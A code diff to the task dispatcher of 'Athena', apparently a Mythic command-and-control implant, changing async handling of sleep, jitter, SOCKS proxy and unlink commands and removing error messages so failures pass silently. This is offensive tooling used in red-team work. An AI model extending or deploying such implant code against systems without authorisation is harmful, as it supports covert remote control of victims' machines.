@@ -21,7 +21,7 @@ namespace Athena.Commands
         /// Kick off a MythicJob
         /// </summary>
         /// <param name="job">MythicJob containing execution parameters</param>
-        public static async void StartJob(MythicJob job)
+        public static async Task StartJob(MythicJob job)
         {
             switch (job.task.command)
             {
@@ -221,7 +221,6 @@ namespace Athena.Commands
                         }
                         catch (Exception e)
                         {
-                            Misc.WriteError(e.Message);
                             job.taskresult += "Invalid sleeptime specified." + Environment.NewLine;
                             job.errored = true;
                         }
@@ -234,7 +233,6 @@ namespace Athena.Commands
                         }
                         catch (Exception e)
                         {
-                            Misc.WriteError(e.Message);
                             job.taskresult += "Invalid jitter specified." + Environment.NewLine;
                             job.errored = true;
                         }
@@ -256,6 +254,7 @@ namespace Athena.Commands
                         {
                             Globals.socksHandler = new SocksHandler();
                             await Globals.socksHandler.Start();
+                            completeJob(ref job, "Socks Started", true);
                         }
                         else
                         {
@@ -276,7 +275,7 @@ namespace Athena.Commands
                         {
                             if (Globals.socksHandler is not null)
                             {
-                                Globals.socksHandler.Stop();
+                                await Globals.socksHandler.Stop();
                                 completeJob(ref job, "Socks stopped.", false);
                             }
                             else
@@ -286,7 +285,6 @@ namespace Athena.Commands
                         }
                         catch (Exception e)
                         {
-                            Misc.WriteError(e.Message);
                             completeJob(ref job, "Socks is not running.", true);
                         }
                     }
@@ -297,7 +295,7 @@ namespace Athena.Commands
                 case "unlink":
                     if (Globals.socksHandler.running)
                     {
-                        Globals.socksHandler.Stop();
+                        await Globals.socksHandler.Stop();
                         completeJob(ref job, "Unlinked from agent.", false);
                     }
                     else
@@ -326,7 +324,6 @@ namespace Athena.Commands
                     }
                     catch (Exception e)
                     {
-                        Misc.WriteError(e.Message);
                         completeJob(ref job, e.Message, true);
                     }
                     break;
@@ -346,7 +343,6 @@ namespace Athena.Commands
             }
             catch (Exception f)
             {
-                Misc.WriteError(f.Message);
                 //Fail silently
             }
         }
